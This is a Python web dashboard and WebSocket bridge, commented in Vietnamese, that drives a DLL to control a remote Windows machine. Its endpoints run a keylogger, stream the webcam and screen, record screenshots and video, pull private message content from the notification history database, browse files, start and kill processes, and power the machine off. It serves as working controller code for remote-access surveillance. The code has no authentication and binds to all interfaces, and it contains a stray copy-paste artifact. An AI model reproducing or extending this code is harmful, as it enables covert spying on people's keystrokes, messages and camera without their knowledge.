# client/webapp.py
# Web UI + integrated lightweight WebSocket bridge (no external libs)
import http.server
import socketserver
import os
import json
import ctypes
import threading
import time
import socket
import sys
import base64
import hashlib
import struct
import sqlite3
import re

# ---------------- CONFIG ----------------
HTTP_PORT = 8000
WS_PORT = 8888
BASE_DIR = os.path.dirname(os.path.abspath(__file__))  # client/
DLL_PATH = os.path.join(BASE_DIR, "client.dll")
WEBCAM_JPG = os.path.join(BASE_DIR, "webcam.jpg")
APPS_TXT = os.path.join(BASE_DIR, "apps.txt")
EXPLORER_TXT = os.path.join(BASE_DIR, "explorer.txt")
INSTALLED_TXT = os.path.join(BASE_DIR, "installed.txt")
KEYLOG_TXT = os.path.join(BASE_DIR, "keylog.txt")
HISTORY_DB = os.path.join(BASE_DIR, "history.db")
SCREENSHOT_BMP = os.path.join(BASE_DIR, "screenshot.bmp")

# ---------------- GLOBALS ----------------
webcam_running = False
lib = None
lib_lock = threading.Lock()  # guard calls to lib if needed
current_mode = None           # 'webcam', 'screen', 'keylogger',...
mode_lock = threading.Lock()  # khóa khi đổi mode
webcam_running = False        # có một stream (webcam/screen) đang chạy hay không

# ---------------- MODE MANAGER (chèn vào webapp.py, top-level) ----------------
# modes: keys and human names
MODES = {
    "webcam": "Xem Webcam",
    "screen": "Xem Màn hình",
    "keylogger": "Keylogger",
    "notify": "Xem Thông báo",
    "files": "Quản lý File",
    "apps": "Apps đang chạy",
    "process": "Processes",
    "custom": "Tùy chọn"
}

# global current running mode
current_mode = None
mode_lock = threading.Lock()


# ---------------- LOAD DLL ----------------
try:
    if os.path.exists(DLL_PATH):
        lib = ctypes.CDLL(DLL_PATH)
        try:
            lib.InitWinsock.restype = None
        except: pass
        print(f"-> [SYSTEM] Loaded DLL: {DLL_PATH}")
    else:
        print(f"-> [WARNING] DLL not found at: {DLL_PATH} (expected)")
except Exception as e:
    print(f"-> [ERROR] Loading DLL failed: {e}")
    lib = None

# optional auto connect attempt (safe)
if lib:
    try:
        lib.InitWinsock.restype = None

        lib.ConnectToServer.argtypes = [ctypes.c_char_p, ctypes.c_int]
        lib.ConnectToServer.restype  = ctypes.c_bool

        lib.SendStringCmd.argtypes   = [ctypes.c_char_p]
        lib.KillProcess.argtypes     = [ctypes.c_char_p]
        lib.StartProcess.argtypes    = [ctypes.c_char_p]

        lib.ReceiveWebcamStream.restype = None
        lib.ReceiveScreenStream.restype = None

        lib.GetAppList.restype        = None
        lib.GetInstalledApps.restype  = None

        lib.GetDrives.restype         = None
        lib.ExplorePath.argtypes      = [ctypes.c_char_p]

        lib.HookKeylog.restype        = None
        lib.UnhookKeylog.restype      = None
        lib.GetKeylog.restype         = None

        lib.GetNotificationHistory.restype = None
        try:
            lib.CaptureScreen.restype = None
        except AttributeError:
            pass

        try:
            lib.ReceiveVideoStream.argtypes = [ctypes.c_int]  # duration (giây)
            lib.ReceiveVideoStream.restype  = None
        except AttributeError:
            pass

        try:
            lib.ShutdownServer.restype = None
        except AttributeError:
            pass

        try:
            lib.RestartServer.restype = None
        except AttributeError:
            pass

    except Exception as e:
        print("[DLL] Set argtypes error:", e)

# ---------------- Small helpers for WebSocket ----------------
WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

def build_ws_response_key(key):
    accept = base64.b64encode(hashlib.sha1((key + WS_GUID).encode('utf-8')).digest()).decode('utf-8')
    return accept

def recv_exact(conn, n):
    data = b''
    while len(data) < n:
        part = conn.recv(n - len(data))
        if not part:
            raise ConnectionError("socket closed")
        data += part
    return data

def read_ws_message(conn):
    # read 2 bytes header
    hdr = recv_exact(conn, 2)
    b1, b2 = hdr[0], hdr[1]
    fin = (b1 >> 7) & 1
    opcode = b1 & 0x0f
    masked = (b2 >> 7) & 1
    payload_len = b2 & 0x7f

    if payload_len == 126:
        ext = recv_exact(conn, 2)
        payload_len = struct.unpack(">H", ext)[0]
    elif payload_len == 127:
        ext = recv_exact(conn, 8)
        payload_len = struct.unpack(">Q", ext)[0]

    mask_key = b''
    if masked:
        mask_key = recv_exact(conn, 4)

    payload = recv_exact(conn, payload_len) if payload_len > 0 else b''

    if masked and payload_len > 0:
        unmasked = bytearray(payload_len)
        for i in range(payload_len):
            unmasked[i] = payload[i] ^ mask_key[i % 4]
        payload = bytes(unmasked)

    # Only handle text (opcode 1) and close (8)
    if opcode == 1:
        try:
            return payload.decode('utf-8', errors='ignore')
        except:
            return ''
    elif opcode == 8:
        raise ConnectionError("Client requested close")
    else:
        # ignore other opcodes
        return ''

def send_ws_message(conn, text):
    payload = text.encode('utf-8')
    header = bytearray()
    header.append(0x81)  # FIN + text frame
    l = len(payload)
    if l < 126:
        header.append(l)
    elif l < (1 << 16):
        header.append(126)
        header.extend(struct.pack(">H", l))
    else:
        header.append(127)
        header.extend(struct.pack(">Q", l))
    conn.sendall(header + payload)

# ---------------- WebSocket bridge (no external libs) ----------------
def ws_client_thread(conn, addr):
    try:
        # perform handshake: read HTTP headers
        data = b''
        while b'\r\n\r\n' not in data:
            chunk = conn.recv(4096)
            if not chunk:
                conn.close(); return
            data += chunk
            if len(data) > 65536: break
        headers = data.decode('utf-8', errors='ignore').split('\r\n')
        key = None
        for h in headers:
            if h.lower().startswith('sec-websocket-key:'):
                key = h.split(':',1)[1].strip()
                break
        if not key:
            conn.close(); return

        accept = build_ws_response_key(key)
        resp = (
            "HTTP/1.1 101 Switching Protocols\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Accept: {accept}\r\n"
            "\r\n"
        )
        conn.sendall(resp.encode('utf-8'))
        print("[WS] Handshake done:", addr)

        # main loop: read text frames
        while True:
            try:
                msg = read_ws_message(conn)
            except ConnectionError:
                break
            if not msg:
                continue
            msg = msg.strip()
            print("[WS recv]:", msg)
            # handle CONNECT command optionally with ip port
            parts = msg.split()
            cmd_upper = parts[0].upper() if parts else ''
            if cmd_upper == "CONNECT":
                target_ip = b"127.0.0.1"
                target_port = 5656
                if len(parts) >= 3:
                    try:
                        target_ip = parts[1].encode('utf-8')
                        target_port = int(parts[2])
                    except:
                        pass
                if lib:
                    try:
                        with lib_lock:
                            ok = lib.ConnectToServer(target_ip, target_port)
                        if ok:
                            send_ws_message(conn, "Bridge OK")
                        else:
                            send_ws_message(conn, "Bridge FAIL")
                    except Exception as e:
                        print("[WS] ConnectToServer error:", e)
                        send_ws_message(conn, "Bridge ERR")
                else:
                    send_ws_message(conn, "NO_DLL")
                continue

            # For other text, send to DLL via SendStringCmd (if available)
            if lib:
                try:
                    with lib_lock:
                        # ensure bytes
                        lib.SendStringCmd(msg.encode('utf-8'))
                    send_ws_message(conn, "SENT:"+msg)
                except Exception as e:
                    print("[WS] SendStringCmd error:", e)
                    send_ws_message(conn, "ERROR_SEND")
            else:
                send_ws_message(conn, "NO_DLL")
        print("[WS] Client disconnected:", addr)
    except Exception as e:
        print("[WS] client thread exception:", e)
    finally:
        try: conn.close()
        except: pass

def ws_listen_thread():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', WS_PORT))
    s.listen(5)
    print(f"[WS] Bridge listening on 0.0.0.0:{WS_PORT}")
    while True:
        try:
            conn, addr = s.accept()
            t = threading.Thread(target=ws_client_thread, args=(conn, addr), daemon=True)
            t.start()
        except Exception as e:
            print("[WS] accept error:", e)
            time.sleep(1)

def wait_for_file(path, timeout=2.0, poll=0.05):
    """Chờ file path xuất hiện và có kích thước > 0 trong timeout giây. Trả True/False."""
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            if os.path.exists(path) and os.path.getsize(path) > 0:
                return True
        except Exception:
            pass
        time.sleep(poll)
    return False


def stop_current_mode():
    """Dừng mode hiện tại một cách an toàn (gửi STOP nếu đang stream)."""
    global current_mode, webcam_running

    # KHÔNG dùng `with mode_lock` ở đây nữa
    if current_mode is None:
        return

    print(f"[MODE] Stopping current_mode: {current_mode}")
    try:
        if current_mode in ("webcam", "screen"):
            # Gửi STOP giống main.py khi tắt webcam/screen
            webcam_running = False
            if lib:
                with lib_lock:
                    lib.SendStringCmd(b"STOP")
            time.sleep(0.3)
        else:
            # Các mode khác nếu server có hỗ trợ STOP thì gửi cho chắc
            if lib:
                with lib_lock:
                    lib.SendStringCmd(b"STOP")
            time.sleep(0.1)
    except Exception as e:
        print("[MODE] stop_current_mode error:", e)

    current_mode = None

def start_mode(mode: str) -> bool:
    """
    Đổi sang mode mới:
    - STOP mode cũ (nếu có) + delay ~2s cho TCP bên C++ kịp xử lý
    - Khởi động logic tương ứng với mode mới
    - Luôn trả True/False nhanh, KHÔNG block vào vòng nhận ảnh.
    """
    global current_mode, webcam_running
    with mode_lock:
        if current_mode == mode:
            print("[MODE] start_mode: already in mode", mode)
            return True

        # 1. Dừng mode cũ (nếu có)
        if current_mode is not None:
            stop_current_mode()
            # cho server C++ đủ thời gian reset trạng thái
            time.sleep(2.0)      # bạn có thể giảm xuống 1.0 nếu thấy OK

        print("[MODE] Starting mode:", mode)
        try:
            if mode == "webcam":
                if not lib:
                    print("[MODE] No DLL to start webcam")
                    return False
                # Gọi giống hệt main.py: chỉ spawn thread ReceiveWebcamStream
                t = threading.Thread(target=lib.ReceiveWebcamStream, daemon=True)
                t.start()
                webcam_running = True

            elif mode == "screen":
                if not lib:
                    print("[MODE] No DLL to start screen stream")
                    return False

                def run_screen():
                    try:
                        # Nếu bạn có ReceiveScreenStream riêng thì dùng trực tiếp:
                        lib.ReceiveScreenStream()
                        # Hoặc nếu chỉ có ReceiveStreamGeneric:
                        # lib.ReceiveStreamGeneric(b"SCREEN", b"webcam.jpg")
                    except Exception as e:
                        print("[MODE] screen stream error:", e)

                t = threading.Thread(target=lib.ReceiveScreenStream, daemon=True)
                t.start()
                webcam_running = True
                
            elif mode == "keylogger":
                # Bật hook keylog, phần đọc nội dung dùng API riêng
                if lib:
                    with lib_lock:
                        lib.HookKeylog()
                else:
                    return False

            elif mode == "notify":
                # Mode này thực chất chỉ là UI; lấy data qua /api/notify/list
                # Ở đây không cần gửi lệnh gì cả (GetNotificationHistory sẽ làm khi gọi API)
                pass

            elif mode == "files":
                # Giống vậy: UI gọi /api/files/drives và /api/files/list để lấy explorer.txt
                pass

            elif mode == "apps":
                # UI tự gọi /api/list_apps để lấy apps.txt
                pass

            elif mode == "process":
                # UI dùng /api/apps/installed + /api/process/start
                pass

            elif mode == "custom":
                # Tự chừa ra cho tương lai
                pass

            else:
                print("[MODE] Unknown mode:", mode)
                return False

            current_mode = mode
            return True

        except Exception as e:
            print("[MODE] start_mode exception:", e)
            return False


# Insert into existing IoTRequestHandler.do_POST handling:
# Add case for '/api/mode' where client sends JSON: {"mode":"webcam"}
# And for GET /api/mode to return {"mode": current_mode}


# ---------------- HTTP handler (same as patched) ----------------
class ThreadingTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    daemon_threads = True
    allow_reuse_address = True

class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        sys.stdout.write("[HTTP] " + (fmt % args) + "\n")

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    # --- Thay thế toàn bộ method do_GET bằng đoạn này ---
    def do_GET(self):
        global webcam_running
        
        if self.path == '/':
            # Chỉ định file cần mở là index.html trong thư mục templates
            self.path = '/templates/index.html'
            
        # --- API: lấy danh sách apps (gọi GetAppList + chờ apps.txt) ---
        elif self.path == '/api/mode':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"mode": current_mode}).encode())
            return
    
        elif self.path == '/api/list_apps':
            print("[HTTP] GET /api/list_apps (calling GetAppList & waiting for file)")
            apps = []
            if lib:
                try:
                    with lib_lock:
                        lib.GetAppList()
                    # chờ tối đa 2s để C++ ghi apps.txt
                    ok = wait_for_file(APPS_TXT, timeout=2.0)
                    if not ok:
                        print("[HTTP] Warning: apps.txt not ready after GetAppList()")
                except Exception as e:
                    print("[HTTP] lib.GetAppList error:", e)

            # đọc file apps.txt (nếu có)
            try:
                if os.path.exists(APPS_TXT):
                    with open(APPS_TXT, "r", encoding="utf-8", errors="ignore") as f:
                        for line in f:
                            p = line.strip().split('|')
                            if len(p) >= 3:
                                apps.append({"id": p[0], "name": p[1], "threads": p[2]})
                else:
                    print("[HTTP] apps.txt not found (GetAppList may have failed).")
            except Exception as e:
                print("[HTTP] read apps.txt error:", e)

            # trả JSON (mảng rỗng nếu không có)
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(apps).encode())
            return

        
        elif self.path == '/api/keylog/text':
            text = ""
            if lib:
                try:
                    with lib_lock:
                        if os.path.exists(KEYLOG_TXT):
                            os.remove(KEYLOG_TXT)
                        lib.GetKeylog()
                    ok = wait_for_file(KEYLOG_TXT, timeout=2.0)
                    if ok and os.path.exists(KEYLOG_TXT):
                        with open(KEYLOG_TXT, "r", errors="ignore") as f:
                            text = f.read()
                except Exception as e:
                    print("[HTTP] GetKeylog error:", e)

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"text": text}).encode())
            return
        
        elif self.path == '/api/notify/list':
            data_list = []
            if lib:
                try:
                    with lib_lock:
                        if os.path.exists(HISTORY_DB):
                            os.remove(HISTORY_DB)
                        lib.GetNotificationHistory()
                    ok = wait_for_file(HISTORY_DB, timeout=3.0)
                    if ok and os.path.exists(HISTORY_DB):
                        conn = sqlite3.connect(HISTORY_DB)
                        cursor = conn.cursor()
                        # Dùng cùng logic như main.py (giữ đơn giản) 
                        try:
                            cursor.execute("SELECT AppId, TimeCreated, Payload FROM Notification ORDER BY TimeCreated DESC LIMIT 200")
                            rows = cursor.fetchall()
                            for app_id, time_str, xml_str in rows:
                                app_id = app_id or ""
                                time_str = time_str or ""
                                xml_str = xml_str or ""

                                content_text = ""
                                try:
                                    matches = re.findall(r'>\s*([^<>]{2,120})\s*<', xml_str)
                                    clean_texts = [m.strip() for m in matches if m.strip()]
                                    if clean_texts:
                                        content_text = " | ".join(clean_texts)
                                except:
                                    pass
                                if not content_text:
                                    clean_chars = "".join([c for c in xml_str if c.isprintable()])
                                    if len(clean_chars) > 5:
                                        content_text = "[RAW] " + clean_chars[:200]
                                if not content_text:
                                    content_text = "[Thông báo hệ thống / Không có nội dung]"

                                if "Skype" in app_id:
                                    app_name = "Skype"
                                elif "Zalo" in app_id:
                                    app_name = "Zalo"
                                elif "Chrome" in app_id:
                                    app_name = "Google Chrome"
                                elif "Explorer" in app_id:
                                    app_name = "Windows System"
                                else:
                                    parts = app_id.split('.')
                                    app_name = parts[-1] if parts else app_id

                                data_list.append({
                                    "app": app_name,
                                    "time": time_str,
                                    "content": content_text
                                })
                        except Exception as e:
                            print("[HTTP] Notification SQL error:", e)
                        conn.close()
                except Exception as e:
                    print("[HTTP] GetNotificationHistory error:", e)

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(data_list).encode())
            return
        
        
        elif self.path == '/api/files/drives':
            entries = []
            if lib:
                try:
                    with lib_lock:
                        if os.path.exists(EXPLORER_TXT):
                            os.remove(EXPLORER_TXT)
                        lib.GetDrives()
                    ok = wait_for_file(EXPLORER_TXT, timeout=2.0)
                    if ok and os.path.exists(EXPLORER_TXT):
                        with open(EXPLORER_TXT, "r", errors="ignore") as f:
                            for line in f:
                                p = line.strip().split('|')
                                if len(p) >= 3:
                                    entries.append({
                                        "name": p[0],
                                        "type": p[1],
                                        "size": p[2]
                                    })
                except Exception as e:
                    print("[HTTP] GetDrives error:", e)
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(entries).encode())
            return
        
        
        elif self.path == '/api/apps/installed':
            print("[HTTP] GET /api/apps/installed")
            apps = []
            if lib:
                try:
                    # Gọi C++ giống main.py :contentReference[oaicite:3]{index=3}
                    with lib_lock:
                        if os.path.exists(INSTALLED_TXT):
                            os.remove(INSTALLED_TXT)
                        lib.GetInstalledApps()
                    ok = wait_for_file(INSTALLED_TXT, timeout=2.0)
                    if ok:
                        with open(INSTALLED_TXT, "r", encoding="utf-8", errors="ignore") as f:
                            for line in f:
                                name = line.strip()
                                if name:
                                    apps.append({"name": name})
                    else:
                        print("[HTTP] installed.txt timeout")
                except Exception as e:
                    print("[HTTP] GetInstalledApps error:", e)

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(apps).encode())
            return
        
        # --- Video stream MJPEG từ webcam.jpg ---
        elif self.path == '/video_feed':
            print("[HTTP] GET /video_feed (stream)")
            self.send_response(200)
            self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
            self.end_headers()
            try:
                while True:
                    if os.path.exists(WEBCAM_JPG):
                        try:
                            with open(WEBCAM_JPG, "rb") as f:
                                img = f.read()
                            # gửi frame
                            self.wfile.write(b'--frame\r\n')
                            self.wfile.write(b'Content-Type: image/jpeg\r\n\r\n')
                            self.wfile.write(img)
                            self.wfile.write(b'\r\n')
                        except (BrokenPipeError, ConnectionResetError):
                            # client đóng kết nối
                            break
                        except Exception as e:
                            print("[HTTP] frame error:", e)
                    else:
                        # không có file: đợi 0.1s rồi tiếp tục
                        pass
                    time.sleep(0.1)
            except Exception as e:
                print("[HTTP] /video_feed exception:", e)
            return

        # mặc định: phục vụ file tĩnh / index
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        global webcam_running
        print("[HTTP] POST", self.path)

        # ---- Start webcam
        if self.path == '/api/webcam/start':
            if not webcam_running:
                webcam_running = True
                if lib:
                    try:
                        # Chỉ gọi trực tiếp hàm stream trong DLL
                        t_stream = threading.Thread(target=lib.ReceiveWebcamStream, daemon=True)
                        t_stream.start()
                        print("[API] Started DLL.ReceiveWebcamStream thread.")
                    except Exception as e:
                        print("[API] Failed to start ReceiveWebcamStream:", e)
                else:
                    print("[API] No DLL loaded - cannot start webcam.")

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
            return
        
        
        elif self.path == '/api/process/start':
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length) if length > 0 else b''
            try:
                payload = json.loads(data.decode('utf-8'))
                app_name = payload.get('name', '')
            except:
                app_name = ''
            if not app_name:
                self.send_response(400); self.end_headers(); self.wfile.write(b'No app'); return

            ok = False
            if lib:
                try:
                    with lib_lock:
                        lib.StartProcess(app_name.encode('utf-8'))
                    ok = True
                except Exception as e:
                    print("[HTTP] StartProcess error:", e)

            self.send_response(200 if ok else 500)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"ok": ok}).encode())
            return
        
        
        elif self.path == '/api/files/list':
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length) if length > 0 else b''
            try:
                payload = json.loads(data.decode('utf-8'))
                path = payload.get('path', '')
            except:
                path = ''

            entries = []
            if lib and path:
                try:
                    with lib_lock:
                        if os.path.exists(EXPLORER_TXT):
                            os.remove(EXPLORER_TXT)
                        lib.ExplorePath(path.encode('utf-8'))
                    ok = wait_for_file(EXPLORER_TXT, timeout=2.0)
                    if ok and os.path.exists(EXPLORER_TXT):
                        with open(EXPLORER_TXT, "r", errors="ignore") as f:
                            for line in f:
                                p = line.strip().split('|')
                                if len(p) >= 3:
                                    entries.append({
                                        "name": p[0],
                                        "type": p[1],
                                        "size": p[2]
                                    })
                except Exception as e:
                    print("[HTTP] ExplorePath error:", e)

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(entries).encode())
            return
        
        
        elif self.path == '/api/keylog/hook':
            ok = False
            if lib:
                try:
                    with lib_lock:
                        lib.HookKeylog()
                    ok = True
                except Exception as e:
                    print("[HTTP] HookKeylog error:", e)
            self.send_response(200 if ok else 500)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"ok": ok}).encode())
            return

        elif self.path == '/api/keylog/unhook':
            ok = False
            if lib:
                try:
                    with lib_lock:
                        lib.UnhookKeylog()
                    ok = True
                except Exception as e:
                    print("[HTTP] UnhookKeylog error:", e)
            self.send_response(200 if ok else 500)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"ok": ok}).encode())
            return
        
        
        # Mode control (Web dashboard)
        elif self.path in ('/api/set_mode', '/api/mode'):
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length) if length > 0 else b''
            try:
                payload = json.loads(body.decode('utf-8'))
                mode = payload.get('mode')
            except Exception:
                mode = None

            if not mode:
                self.send_response(400)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "status": "error",
                    "msg": "Bad mode"
                }).encode())
                return

            if mode not in MODES:
                self.send_response(400)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "status": "error",
                    "msg": "Unknown mode"
                }).encode())
                return

            ok = start_mode(mode)
            if ok:
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "status": "ok",
                    "mode": mode
                }).encode())
            else:
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "status": "error"
                }).encode())
            return
        
        # ---- Stop webcam
        elif self.path == '/api/webcam/stop':
            webcam_running = False
            if lib:
                try:
                    with lib_lock:
                        # use STOP (matches main.py behavior) to gracefully stop streaming
                        lib.SendStringCmd(b"STOP")
                    print("[API] Sent STOP to DLL.")
                except Exception as e:
                    print("[API] Send STOP error:", e)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
            return

        # ---- Kill process (body JSON {pid: "1234"})
        elif self.path == '/api/kill':
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length) if length > 0 else b''
            pid = None
            try:
                payload = json.loads(data.decode('utf-8'))
                pid = payload.get('pid')
            except Exception:
                try:
                    pid = data.decode('utf-8')
                except:
                    pid = None
            if pid and lib:
                try:
                    with lib_lock:
                        lib.KillProcess(pid.encode('utf-8'))
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({"ok": True}).encode())
                except Exception as e:
                    print("[API] KillProcess error:", e)
                    self.send_response(500)
                    self.end_headers()
                    self.wfile.write(str(e).encode())
            else:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b"Bad Request or DLL not loaded")
            return

        elif self.path == '/api/screen/record':
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length) if length > 0 else b''
            duration = 10
            try:
                payload = json.loads(data.decode('utf-8'))
                d = int(payload.get('duration', 10))
                if d > 0:
                    duration = d
            except Exception:
                pass

            if not lib:
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"ok": False, "error": "No DLL"}).encode())
                return

            def record_task():
                try:
                    print(f"[REC] Bắt đầu quay màn hình {duration}s...")
                    lib.ReceiveVideoStream(duration)
                    print("[REC] Kết thúc quay màn hình.")
                except Exception as e:
                    print("[REC] error:", e)

            threading.Thread(target=record_task, daemon=True).start()

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"ok": True, "duration": duration}).encode())
            return
        
        elif self.path == '/api/screen/snapshot':
            if not lib:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b"No DLL")
                return

            # Xóa file cũ (nếu có) cho chắc
            try:
                if os.path.exists(SCREENSHOT_BMP):
                    os.remove(SCREENSHOT_BMP)
            except:
                pass

            try:
                with lib_lock:
                    lib.CaptureScreen()
            except Exception as e:
                print("[HTTP] CaptureScreen error:", e)
                self.send_response(500)
                self.end_headers()
                self.wfile.write(str(e).encode())
                return

            # Chờ file screenshot.bmp xuất hiện
            if not wait_for_file(SCREENSHOT_BMP, timeout=3.0, poll=0.1):
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b"Screenshot not ready")
                return

            # Trả luôn file (Content-Type bmp)
            try:
                with open(SCREENSHOT_BMP, "rb") as f:
                    data = f.read()
                self.send_response(200)
                self.send_header("Content-Type", "image/bmp")
                self.end_headers()
                self.wfile.write(data)
            except Exception as e:
                print("[HTTP] read screenshot error:", e)
                self.send_response(500)
                self.end_headers()
                self.wfile.write(str(e).encode())
            return
        
        elif self.path == '/api/power':
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length) if length > 0 else b''
            action = None
            try:
                payload = json.loads(data.decode('utf-8'))
                action = (payload.get('action') or "").lower()
            except Exception:
                pass

            if not lib or not action:
                self.send_response(400)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"ok": False, "error": "Bad request or no DLL"}).encode())
                return

            ok = False
            try:
                with lib_lock:
                    if action == "shutdown" and hasattr(lib, "ShutdownServer"):
                        lib.ShutdownServer()
                        ok = True
                    elif action == "restart" and hasattr(lib, "RestartServer"):
                        lib.RestartServer()
                        ok = True
            except Exception as e:
                print("[HTTP] power error:", e)

            self.send_response(200 if ok else 500)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"ok": ok}).encode())
            return
        
        
        else:
            self.send_error(404)
            return
        

# ---------------- RUN BOTH HTTP + WS ----------------
def run_http_server():
    os.chdir(BASE_DIR)
    print("CWD ->", os.getcwd())
    with ThreadingTCPServer(("0.0.0.0", HTTP_PORT), IoTRequestHandler) as httpd:
        print(f"-> [WEB UI] Access: http://localhost:{HTTP_PORT}")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("Shutting down HTTP server...")

if __name__ == "__main__":
    # start ws bridge thread
    t = threading.Thread(target=ws_listen_thread, daemon=True)
    t.start()
    print("[MAIN] Started WS bridge thread (port {})".format(WS_PORT))
    print("\n--- STARTING WEBAPP (with built-in WS bridge) ---")
    run_http_server()
